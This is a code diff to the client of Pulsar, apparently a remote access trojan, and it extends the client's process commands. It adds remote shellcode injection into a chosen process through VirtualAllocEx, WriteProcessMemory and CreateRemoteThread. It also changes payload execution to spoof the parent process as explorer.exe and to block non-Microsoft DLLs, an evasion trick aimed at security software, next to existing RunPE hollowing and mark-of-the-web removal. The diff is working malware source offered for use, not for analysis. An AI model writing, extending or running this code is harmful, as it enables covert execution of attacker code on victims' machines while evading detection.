@@ -16,6 +16,9 @@ using System.Management;
 using System.Net;
 using System.Reflection;
 using System.Threading;
+using static Pulsar.Client.Utilities.NativeMethods;
+using System.Runtime.InteropServices;
+using SIZE_T = System.UIntPtr;
 
 namespace Pulsar.Client.Messages
 {
@@ -44,7 +47,8 @@ namespace Pulsar.Client.Messages
             message is DoProcessDump ||
             message is DoSetTopMost ||
             message is DoSuspendProcess ||
-            message is DoSetWindowState;
+            message is DoSetWindowState ||
+            message is DoInjectShellcodeIntoProcess; // Add this line
 
         public bool CanExecuteFrom(ISender sender) => true;
 
@@ -65,6 +69,128 @@ namespace Pulsar.Client.Messages
                 case DoSuspendProcess msg: Execute(sender, msg); break;
                 case DoSetTopMost msg: Execute(sender, msg); break;
                 case DoSetWindowState msg: Execute(sender, msg); break;
+                case DoInjectShellcodeIntoProcess msg: Execute(sender, msg); break; // Add this line
+            }
+        }
+
+        private bool InjectShellcodeIntoProcess(Process targetProcess, byte[] shellcode)
+        {
+            IntPtr processHandle = IntPtr.Zero;
+            IntPtr allocatedMemory = IntPtr.Zero;
+            IntPtr threadHandle = IntPtr.Zero;
+
+            try
+            {
+                // Open the target process with necessary permissions
+                processHandle = Utilities.NativeMethods.OpenProcess(
+                    Utilities.NativeMethods.ProcessAccessFlags.VM_OPERATION |
+                    Utilities.NativeMethods.ProcessAccessFlags.VM_WRITE |
+                    Utilities.NativeMethods.ProcessAccessFlags.CREATE_THREAD |
+                    Utilities.NativeMethods.ProcessAccessFlags.QUERY_INFORMATION,
+                    false, (uint)targetProcess.Id);
+
+                if (processHandle == IntPtr.Zero)
+                {
+                    SendStatus($"Failed to open process handle (Error: {Marshal.GetLastWin32Error()})");
+                    return false;
+                }
+
+                // Allocate memory in the target process
+                allocatedMemory = Utilities.NativeMethods.VirtualAllocEx(
+                    processHandle,
+                    IntPtr.Zero,
+                    (uint)shellcode.Length,
+                    Utilities.NativeMethods.AllocationType.Commit | Utilities.NativeMethods.AllocationType.Reserve,
+                    Utilities.NativeMethods.MemoryProtection.ExecuteReadWrite);
+
+                if (allocatedMemory == IntPtr.Zero)
+                {
+                    SendStatus($"Failed to allocate memory in target process (Error: {Marshal.GetLastWin32Error()})");
+                    return false;
+                }
+
+                // Write shellcode to allocated memory
+                bool writeSuccess = Utilities.NativeMethods.WriteProcessMemory(
+                    processHandle,
+                    allocatedMemory,
+                    shellcode,
+                    (uint)shellcode.Length,
+                    out _);
+
+                if (!writeSuccess)
+                {
+                    SendStatus($"Failed to write shellcode to target process (Error: {Marshal.GetLastWin32Error()})");
+                    return false;
+                }
+
+                // Create remote thread to execute the shellcode
+                threadHandle = Utilities.NativeMethods.CreateRemoteThread(
+                    processHandle,
+                    IntPtr.Zero,
+                    0,
+                    allocatedMemory,
+                    IntPtr.Zero,
+                    0,
+                    out _);
+
+                if (threadHandle == IntPtr.Zero)
+                {
+                    SendStatus($"Failed to create remote thread (Error: {Marshal.GetLastWin32Error()})");
+                    return false;
+                }
+
+                // Wait for thread to complete (optional - you might want to remove this for async execution)
+                Utilities.NativeMethods.WaitForSingleObject(threadHandle, 0xFFFFFFFF);
+
+                return true;
+            }
+            catch (Exception ex)
+            {
+                SendStatus($"Injection error: {ex.Message}");
+                return false;
+            }
+            finally
+            {
+                // Clean up handles
+                if (threadHandle != IntPtr.Zero) Utilities.NativeMethods.CloseHandle(threadHandle);
+                if (allocatedMemory != IntPtr.Zero) Utilities.NativeMethods.VirtualFreeEx(processHandle, allocatedMemory, 0, Utilities.NativeMethods.FreeType.Release);
+                if (processHandle != IntPtr.Zero) Utilities.NativeMethods.CloseHandle(processHandle);
+            }
+        }
+        private void Execute(ISender client, DoInjectShellcodeIntoProcess message)
+        {
+            try
+            {
+                SendStatus($"Injecting shellcode into process PID: {message.ProcessId}");
+
+                if (message.Shellcode == null || message.Shellcode.Length == 0)
+                {
+                    SendStatus("Shellcode injection failed: Empty shellcode");
+                    return;
+                }
+
+                Process targetProcess = Process.GetProcessById(message.ProcessId);
+                if (targetProcess == null)
+                {
+                    SendStatus($"Shellcode injection failed: Process PID {message.ProcessId} not found");
+                    return;
+                }
+
+                // Perform the injection
+                bool success = InjectShellcodeIntoProcess(targetProcess, message.Shellcode);
+
+                if (success)
+                {
+                    SendStatus($"Shellcode successfully injected into PID {message.ProcessId} ({targetProcess.ProcessName})");
+                }
+                else
+                {
+                    SendStatus($"Shellcode injection failed for PID {message.ProcessId}");
+                }
+            }
+            catch (Exception ex)
+            {
+                SendStatus($"Shellcode injection error for PID {message.ProcessId}: {ex.Message}");
             }
         }
         private void Execute(ISender client, DoProcessEnd message)
@@ -265,7 +391,17 @@ namespace Pulsar.Client.Messages
             }
             else
             {
-                ExecuteProcess(message.FileBytes, message.FilePath, message.IsUpdate, message.ExecuteInMemoryDotNet, message.UseRunPE, message.RunPETarget, message.RunPECustomPath, message.FileExtension);
+                ExecuteProcess(
+                    message.FileBytes,
+                    message.FilePath,
+                    message.IsUpdate,
+                    message.ExecuteInMemoryDotNet,
+                    message.UseRunPE,
+                    message.RunPETarget,
+                    message.RunPECustomPath,
+                    message.FileExtension,
+                    message.IsFromFileManager   // <<< NEW
+                );
             }
         }
 
@@ -278,12 +414,51 @@ namespace Pulsar.Client.Messages
                 SendStatus("Process start failed: Download cancelled or error");
                 return;
             }
-            ExecuteProcess(e.Result, null, message.IsUpdate, message.ExecuteInMemoryDotNet, message.UseRunPE, message.RunPETarget, message.RunPECustomPath, message.FileExtension);
+            ExecuteProcess(
+                message.FileBytes,
+                message.FilePath,
+                message.IsUpdate,
+                message.ExecuteInMemoryDotNet,
+                message.UseRunPE,
+                message.RunPETarget,
+                message.RunPECustomPath,
+                message.FileExtension,
+                message.IsFromFileManager   // <<< NEW
+            );
         }
 
-        private void ExecuteProcess(byte[] fileBytes, string filePath, bool isUpdate, bool executeInMemory, bool useRunPE, string runPETarget, string runPECustomPath, string fileExtension)
+        private void ExecuteProcess(byte[] fileBytes, string filePath, bool isUpdate, bool executeInMemory,
+            bool useRunPE, string runPETarget, string runPECustomPath, string fileExtension, bool isFromFileManager)
         {
-            if (fileBytes == null && !string.IsNullOrEmpty(filePath) && File.Exists(filePath))
+            // ------------------------------------------------------------
+            // 1. FILE MANAGER NORMAL EXECUTION (NO BYTES, NO TEMP, NO POLICY)
+            // ------------------------------------------------------------
+            if (isFromFileManager && !string.IsNullOrEmpty(filePath) && File.Exists(filePath))
+            {
+                try
+                {
+                    Process.Start(new ProcessStartInfo
+                    {
+                        FileName = filePath,
+                        UseShellExecute = true
+                    });
+
+                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
+                    SendStatus($"Executed normally (File Manager): {filePath}");
+                }
+                catch (Exception ex)
+                {
+                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
+                    SendStatus($"Normal execution failed: {ex.Message}");
+                }
+
+                return;
+            }
+
+            // ------------------------------------------------------------
+            // 2. REMOTE EXECUTION LOGIC (UPLOAD EXECUTION)
+            // ------------------------------------------------------------
+            if (fileBytes == null && filePath != null && File.Exists(filePath))
                 fileBytes = File.ReadAllBytes(filePath);
 
             if (fileBytes == null || fileBytes.Length == 0)
@@ -295,8 +470,19 @@ namespace Pulsar.Client.Messages
 
             try
             {
-                if (useRunPE) { ExecuteViaRunPE(fileBytes, runPETarget, runPECustomPath); return; }
-                if (executeInMemory) { ExecuteViaInMemoryDotNet(fileBytes); return; }
+                if (useRunPE)
+                {
+                    ExecuteViaRunPE(fileBytes, runPETarget, runPECustomPath);
+                    return;
+                }
+
+                if (executeInMemory)
+                {
+                    ExecuteViaInMemoryDotNet(fileBytes);
+                    return;
+                }
+
+                // default remote execution
                 ExecuteViaTemporaryFile(fileBytes, fileExtension);
             }
             catch (Exception ex)
@@ -345,6 +531,7 @@ namespace Pulsar.Client.Messages
             }).Start();
         }
 
+
         private void ExecuteViaTemporaryFile(byte[] fileBytes, string fileExtension)
         {
             try
@@ -352,17 +539,178 @@ namespace Pulsar.Client.Messages
                 string tempPath = FileHelper.GetTempFilePath(fileExtension ?? ".exe");
                 File.WriteAllBytes(tempPath, fileBytes);
                 FileHelper.DeleteZoneIdentifier(tempPath);
-                Process.Start(new ProcessStartInfo { UseShellExecute = true, FileName = tempPath });
-                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
-                SendStatus("Process executed via temporary file");
+
+                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+
+                // USE NATIVE METHODS VERSION STRICTLY
+                var si = new Utilities.NativeMethods.STARTUPINFOEX();
+                si.StartupInfo.cb = Marshal.SizeOf(typeof(Utilities.NativeMethods.STARTUPINFOEX));
+
+                // Get explorer.exe PID and directory for spoofing
+                var (parentPid, parentDirectory) = GetExplorerPidAndDirectory();
+                SendStatus($"Using PPID spoofing with parent: {parentPid}");
+                SendStatus($"Using directory: {parentDirectory}");
+
+                // ---- ATTRIBUTE LIST ----
+                IntPtr attrSize = IntPtr.Zero;
+
+                // First call retrieves required bytes (2 attributes: PPID + mitigation)
+                Utilities.NativeMethods.InitializeProcThreadAttributeList(
+                    IntPtr.Zero, 2, 0, ref attrSize);
+
+                si.lpAttributeList = Marshal.AllocHGlobal(attrSize);
+
+                if (!Utilities.NativeMethods.InitializeProcThreadAttributeList(
+                    si.lpAttributeList, 2, 0, ref attrSize))
+                {
+                    throw new Exception("InitializeProcThreadAttributeList failed.");
+                }
+
+                IntPtr parentProcessHandle = IntPtr.Zero;
+                IntPtr lpValueProc = IntPtr.Zero;
+
+                try
+                {
+                    // Set PPID spoofing
+                    parentProcessHandle = OpenProcess(ProcessAccessFlags.PROCESS_CREATE_PROCESS, false, parentPid);
+                    if (parentProcessHandle == IntPtr.Zero)
+                    {
+                        int error = Marshal.GetLastWin32Error();
+                        throw new Exception($"OpenProcess failed for PPID: 0x{error:X8}");
+                    }
+
+                    lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
+                    Marshal.WriteIntPtr(lpValueProc, parentProcessHandle);
+
+                    // Update attribute for PPID spoofing
+                    ulong ppidValue = (ulong)parentProcessHandle.ToInt64();
+                    if (!Utilities.NativeMethods.UpdateProcThreadAttribute(
+                        si.lpAttributeList,
+                        0,
+                        (IntPtr)0x00020000, // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
+                        ref ppidValue,
+                        (IntPtr)IntPtr.Size,
+                        IntPtr.Zero,
+                        IntPtr.Zero))
+                    {
+                        int error = Marshal.GetLastWin32Error();
+                        throw new Exception($"UpdateProcThreadAttribute (PPID) failed: 0x{error:X8}");
+                    }
+
+                    // Set block non-Microsoft DLLs policy
+                    ulong policy = Utilities.NativeMethods.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+
+                    if (!Utilities.NativeMethods.UpdateProcThreadAttribute(
+                        si.lpAttributeList,
+                        0,
+                        Utilities.NativeMethods.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
+                        ref policy,
+                        (IntPtr)sizeof(ulong),
+                        IntPtr.Zero,
+                        IntPtr.Zero))
+                    {
+                        throw new Exception("UpdateProcThreadAttribute (Mitigation) failed.");
+                    }
+
+                    // ---- CREATE PROCESS ----
+                    bool ok = Utilities.NativeMethods.CreateProcess(
+                        null,
+                        $"\"{tempPath}\"", // Quote the path in case of spaces
+                        IntPtr.Zero,
+                        IntPtr.Zero,
+                        false,
+                        Utilities.NativeMethods.EXTENDED_STARTUPINFO_PRESENT,
+                        IntPtr.Zero,
+                        parentDirectory, // Use explorer.exe directory for spoofing
+                        ref si,
+                        out pi
+                    );
+
+                    if (ok)
+                    {
+                        Utilities.NativeMethods.CloseHandle(pi.hProcess);
+                        Utilities.NativeMethods.CloseHandle(pi.hThread);
+
+                        _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
+                        SendStatus($"Process executed with PPID spoofing and mitigation policy (PID: {pi.dwProcessId})");
+                    }
+                    else
+                    {
+                        // Fallback without spoofing
+                        Process.Start(new ProcessStartInfo
+                        {
+                            FileName = tempPath,
+                            UseShellExecute = true,
+                            WorkingDirectory = parentDirectory
+                        });
+
+                        _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
+                        SendStatus("Executed via fallback Process.Start()");
+                    }
+                }
+                finally
+                {
+                    // Cleanup
+                    if (si.lpAttributeList != IntPtr.Zero)
+                    {
+                        Utilities.NativeMethods.DeleteProcThreadAttributeList(si.lpAttributeList);
+                        Marshal.FreeHGlobal(si.lpAttributeList);
+                    }
+                    if (lpValueProc != IntPtr.Zero) Marshal.FreeHGlobal(lpValueProc);
+                    if (parentProcessHandle != IntPtr.Zero) CloseHandle(parentProcessHandle);
+                }
             }
             catch (Exception ex)
             {
                 _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
-                SendStatus($"Temporary file execution failed: {ex.Message}");
+                SendStatus("Temporary file execution failed: " + ex.Message);
             }
         }
 
+        // Add these missing methods and enums to your class
+        private (uint pid, string directory) GetExplorerPidAndDirectory()
+        {
+            Process[] explorerProcesses = Process.GetProcessesByName("explorer");
+            if (explorerProcesses.Length > 0)
+            {
+                var explorer = explorerProcesses[0];
+                string directory;
+
+                try
+                {
+                    // Try to get the actual working directory of explorer.exe
+                    directory = Path.GetDirectoryName(explorer.MainModule.FileName);
+                    if (string.IsNullOrEmpty(directory))
+                    {
+                        // Fallback to Windows directory
+                        directory = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
+                    }
+                }
+                catch
+                {
+                    // Fallback to Windows directory if we can't access the process
+                    directory = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
+                }
+
+                return ((uint)explorer.Id, directory);
+            }
+            throw new Exception("No explorer.exe process found for PPID spoofing");
+        }
+
+        // Add these P/Invoke declarations to your NativeMethods class or use existing ones
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool CloseHandle(IntPtr hObject);
+
+        [Flags]
+        private enum ProcessAccessFlags : uint
+        {
+            PROCESS_CREATE_PROCESS = 0x0080,
+            PROCESS_QUERY_INFORMATION = 0x0400,
+            PROCESS_VM_READ = 0x0010
+        }
         private Dictionary<int, int?> GetParentProcessMap()
         {
             var map = new Dictionary<int, int?>();
